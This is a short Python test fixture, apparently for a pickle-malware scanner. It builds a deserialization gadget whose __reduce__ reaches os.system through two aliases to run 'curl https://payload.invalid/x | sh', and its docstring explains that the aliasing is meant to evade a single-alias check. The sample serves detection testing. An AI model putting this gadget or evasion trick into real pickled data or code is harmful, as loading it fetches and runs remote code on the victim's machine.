# FIXTURE ONLY - synthetic detection test sample, not real malware
"""Evasion variant: the pickle gadget's callable reaches os.system through two local aliases,
one more than a single alias lookup follows. Unpickling would run the command; nothing runs."""
import os


class Stage:
    def __reduce__(self):
        a = os.system
        b = a
        return (b, ("curl https://payload.invalid/x | sh",))
